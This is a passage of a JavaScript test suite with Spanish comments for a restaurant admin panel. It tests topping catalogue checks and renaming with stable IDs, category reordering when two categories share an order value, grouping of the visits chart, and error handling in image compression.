		// Avisar de más es mejor que callarse de menos: mientras quede un plato
		// con nombres, borrar del catálogo tiene que seguir preguntando.
		const porNombre = { nombre: 'Perro', atributos: { personalizacion: { salsas: ['BBQ'] } } };
		assert.equal(buscar(catalogo, [porNombre]).length, 0, 'mientras exista, no estorba');
		const avisos = buscar({ ...catalogo, salsas: [] }, [porNombre]);
		assert.equal(avisos.length, 1);
		assert.match(avisos[0], /BBQ/);
	});

	test('un plato sin personalización no estorba', () => {
		assert.equal(buscar({ ...catalogo, salsas: [] }, [{ nombre: 'Gaseosa', atributos: {} }]).length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('confirmAddTopping · añadir y renombrar en la pestaña Toppings', () => {
	// Renombrar no se podía hacer desde el panel: solo añadir y borrar,
	// justamente porque renombrar dejaba a los platos apuntando a un nombre
	// que ya no existía. Ahora conserva el identificador, así que es seguro.
	const montar = (toppingState, campos) => {
		const avisos = [];
		const elementos = {};
		const el = id => (elementos[id] ||= { value: '', textContent: '', style: {} });
		for (const [id, v] of Object.entries(campos)) el(id).value = v;

		const ctx = cargar('index.html', [
			['function catalogoDe', '// ── PERSONALIZACIÓN DEL PLATO'],
			['const CONTENEDOR_TOPPING', '// ── PEDIDOS'],
		], {
			toppingState,
			document: { getElementById: el },
			showToast: (m, t) => avisos.push([t, m]),
			openModal: () => {}, closeModal: () => {},
			renderToppingList: () => {},
			state: { productos: [], restaurante: { id: 'r1' } },
			apiFetch: async () => ({}),
			ajustarPestanasAlModelo: () => {},
			confirm: () => true,
			crypto: globalThis.crypto,
		});
		ctx.confirmAddTopping();
		return avisos;
	};

	const nuevoEstado = () => ({
		platino: [{ id: 't_que', nombre: 'Queso' }],
		premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 3000 }],
		salsas:  [],
	});

	test('renombrar CONSERVA el identificador', () => {
		// La prueba que justifica el cambio entero. Si el id cambiara, todos los
		// platos que ofrecen ese topping se quedarían colgados en silencio.
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'platino', toppingIndice: '0', toppingNombre: 'Queso doble' });
		assert.equal(st.platino[0].id, 't_que', 'el identificador no se toca');
		assert.equal(st.platino[0].nombre, 'Queso doble');
		assert.equal(st.platino.length, 1, 'no crea uno nuevo');
	});

	test('renombrar un premium puede cambiarle el precio', () => {
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'premium', toppingIndice: '0', toppingNombre: 'Tocineta', toppingPrecio: '5000' });
		assert.equal(st.premium[0].id, 't_toc');
		assert.equal(st.premium[0].precio, 5000);
	});

	test('añadir uno nuevo le pone un identificador propio', () => {
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: 'BBQ' });
		assert.equal(st.salsas.length, 1);
		assert.match(st.salsas[0].id, /^top_[a-z0-9]{1,8}$/);
		assert.equal(st.salsas[0].nombre, 'BBQ');
	});

	test('el identificador nuevo no choca con los de los otros grupos', () => {
		// Los platos guardan una lista por grupo, pero un choque entre grupos
		// confundiría a cualquiera que lea 'atributos' a mano.
		const st = nuevoEstado();
		for (const nombre of ['BBQ', 'Rosada', 'Ajo'])
			montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: nombre });
		const todos = [...st.platino, ...st.premium, ...st.salsas].map(t => t.id);
		assert.equal(new Set(todos).size, todos.length, 'todos distintos');
	});

	test('un nombre repetido se rechaza', () => {
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'platino', toppingIndice: '', toppingNombre: '  queso ' });
		assert.equal(st.platino.length, 1, 'no se añade');
		assert.equal(avisos[0][0], 'error');
	});

	test('renombrar sin cambiar el nombre no se rechaza a sí mismo', () => {
		// Entrar a editar solo para tocar el precio no puede dar "ya existe".
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'premium', toppingIndice: '0', toppingNombre: 'Tocineta', toppingPrecio: '7000' });
		assert.equal(st.premium[0].precio, 7000);
		assert.ok(!avisos.some(a => a[0] === 'error'), 'no debe quejarse');
	});

	test('un nombre vacío no crea nada', () => {
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: '   ' });
		assert.equal(st.salsas.length, 0);
		assert.equal(avisos[0][0], 'error');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('moveCat · reordenar cuando dos categorías empatan en "orden"', () => {
	// Intercambiaba los dos valores de 'orden'. Con dos categorías empatadas
	// eso es intercambiar un número consigo mismo: no se movía nada y el panel
	// decía "Orden actualizado" igual. Y empatar es fácil — openNewCatModal
	// siembra `orden = state.categorias.length`, así que basta borrar una
	// categoría y crear otra.
	const mover = async (categorias, id, dir) => {
		const patches = [];
		const ctx = cargar('index.html', [
			['async function enTandas', 'function ordenProductosModo'],
			['// Reasigna 0,1,2… a toda la lista', '// ── ELIMINAR'],
		], {
			state: { categorias, restaurante: { id: 'r1' } },
			apiFetch: async (m, ruta, cuerpo) => { patches.push({ ruta, ...cuerpo }); return {}; },
			renderCatList() {}, renderCatFilter() {}, showToast() {},
		});
		await ctx.moveCat(id, dir);
		return { patches,
			orden: ctx.state.categorias.map(c => c.nombre),
			valores: ctx.state.categorias.map(c => c.orden) };
	};

	test('con órdenes ya distintos, mueve como siempre', async () => {
		const { orden } = await mover(
			[{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Fuertes', orden: 1 }], 'b', -1);
		assert.deepEqual([...orden], ['Fuertes', 'Entradas']);
	});

	test('con dos empatadas en 0, el movimiento sí ocurre', async () => {
		const { orden, valores } = await mover(
			[{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Postres', orden: 0 }], 'b', -1);
		assert.deepEqual([...orden], ['Postres', 'Entradas'], 'antes se quedaban como estaban');
		// Y el empate se deshace: 0 y 1, no dos ceros. Se mira el resultado y no
		// cuántos PATCH salieron — solo se manda lo que de verdad cambia, así
		// que una de las dos puede quedarse con el número que ya tenía.
		assert.deepEqual([...valores], [0, 1]);
	});

	test('no se sale por los extremos', async () => {
		const cats = [{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Fuertes', orden: 1 }];
		assert.equal((await mover(cats, 'a', -1)).patches.length, 0, 'la primera no sube');
		assert.equal((await mover(cats, 'b', 1)).patches.length, 0, 'la última no baja');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('agruparVisitas · la gráfica no puede pintar una barra por día', () => {
	// Con una barra por día, el rango "Todo" —que arranca en 2020— pintaba
	// 2.431 barras: unos 41.000 px de scroll horizontal que nadie recorre. Y
	// el `Math.max(1, ...dias)` recibía un argumento por día, así que un rango
	// bastante antiguo lo hacía reventar.
	const ctx = () => cargar('index.html', [
		['function fmtISO', 'function hoyEnZona'],
		['const MAX_BARRAS_VISITAS', 'function renderGraficaVisitas'],
	], {});

	const agrupar = (visitas, desde, hasta) => ctx().agruparVisitas(visitas, desde, hasta);

	test('un rango corto sigue siendo un día por barra', () => {
		const { barras, porBarra } = agrupar({ '2026-08-01': 3, '2026-08-03': 5 }, '2026-08-01', '2026-08-05');
		assert.equal(porBarra, 1);
		assert.equal(barras.length, 5);
		assert.equal(barras[0].visitas, 3);
		assert.equal(barras[1].visitas, 0, 'los días sin visitas cuentan cero, no se saltan');
		assert.equal(barras[2].visitas, 5);
	});

	test('el rango "Todo" se agrupa en vez de desbordarse', () => {
		const { barras, porBarra } = agrupar({}, '2020-01-01', '2026-08-27');
		assert.ok(barras.length <= 92, `92 como mucho, salieron ${barras.length}`);
		assert.ok(porBarra > 1, 'tiene que haber agrupado');
		assert.equal(barras[0].desde, '2020-01-01', 'empieza donde se pidió');
		assert.equal(barras[barras.length - 1].hasta, '2026-08-27', 'y termina donde se pidió');
	});

	test('agrupando no se pierde ni se duplica ninguna visita', () => {
		// Lo que más importa: la suma de las barras tiene que ser la suma de
		// los días. Si el agrupado se saltara un día o lo contara dos veces,
		// la gráfica mentiría y no habría forma de notarlo a ojo.
		const visitas = {};
		let total = 0;
		const d = new Date(Date.UTC(2025, 0, 1, 12));
		for (let i = 0; i < 400; i++) {
			const iso = d.toISOString().slice(0, 10);
			visitas[iso] = i % 7;
			total += i % 7;
			d.setUTCDate(d.getUTCDate() + 1);
		}
		const { barras } = agrupar(visitas, '2025-01-01', '2026-02-04');
		assert.equal(barras.reduce((s, b) => s + b.visitas, 0), total);
	});

	test('un rango al revés se avisa, no se pinta vacío', () => {
		const r = agrupar({}, '2026-08-27', '2026-08-01');
		assert.equal(r.invertido, true);
		assert.equal(r.barras.length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('compressImage · formato de salida y fallos que antes colgaban', () => {
	// Dos fallos en la misma función. Salía siempre JPEG, y JPEG no tiene canal
	// alfa: un logo PNG con fondo transparente acababa con un rectángulo negro.
	// Y la promesa no tenía 'rej' ni manejadores de error, así que un archivo
	// que no decodificaba dejaba la promesa sin resolver PARA SIEMPRE — el
	// panel se quedaba en "Subiendo..." y no había más salida que recargar.
	function entorno({ fallaLectura = false, fallaDecodificacion = false, blobNulo = false } = {}) {
		const visto = {};
		return {
			visto,
			FileReader: class {
				readAsDataURL() {
					setTimeout(() => fallaLectura ? this.onerror?.() : this.onload?.({ target: { result: 'data:,' } }), 0);
				}
			},
			Image: class {
				constructor() { this.width = 1000; this.height = 500; }
				set src(_) { setTimeout(() => fallaDecodificacion ? this.onerror?.() : this.onload?.(), 0); }
			},
			document: {
				createElement: () => ({
					getContext: () => ({ drawImage() {} }),
					toBlob(cb, tipo) { visto.tipo = tipo; cb(blobNulo ? null : { type: tipo }); },
				}),
			},
		};
	}

	const comprimir = (archivo, opciones, fallos) => {
		const ctx = entorno(fallos);
		const cargado = cargar('index.html', [['function compressImage', 'async function uploadImg']], ctx);
		return { promesa: cargado.compressImage(archivo, 500, .9, opciones), visto: ctx.visto };
	};

	test('un logo PNG se queda en PNG', async () => {
		const { promesa, visto } = comprimir({ type: 'image/png' }, { conservarTransparencia: true });
		const blob = await promesa;
		assert.equal(visto.tipo, 'image/png');
		assert.equal(blob.type, 'image/png');
	});

	test('una foto de plato sigue saliendo JPEG', async () => {
		const { promesa, visto } = comprimir({ type: 'image/png' }, {});
		await promesa;
		assert.equal(visto.tipo, 'image/jpeg', 'sin pedirlo, no se conserva la transparencia');
	});

	test('un JPEG no se convierte a PNG aunque se pida transparencia', async () => {
		// Convertirlo no recupera una transparencia que nunca tuvo, y sí
		// multiplica el peso.
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, { conservarTransparencia: true });
		await promesa;
		assert.equal(visto.tipo, 'image/jpeg');
	});

	test('un archivo que no decodifica RECHAZA en vez de colgarse', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { fallaDecodificacion: true });
		await assert.rejects(() => promesa, /no es una imagen/);
	});

	test('un archivo ilegible también rechaza', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { fallaLectura: true });
		await assert.rejects(() => promesa, /No se pudo leer/);
	});

	test('y un toBlob que devuelve null tampoco deja la promesa colgada', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { blobNulo: true });
		await assert.rejects(() => promesa, /No se pudo procesar/);
	});
});
